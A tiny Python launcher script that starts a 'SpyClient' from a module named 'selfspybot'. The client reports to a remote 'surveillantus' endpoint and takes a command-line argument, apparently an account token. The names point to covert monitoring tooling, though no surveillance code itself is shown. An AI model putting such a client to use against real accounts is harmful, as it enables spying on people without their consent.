import sys
import selfspybot

args=sys.argv
spybot=selfspybot.SpyClient(endpoint="https://api-himitu/surveillantus_api")
spybot.run(args[1])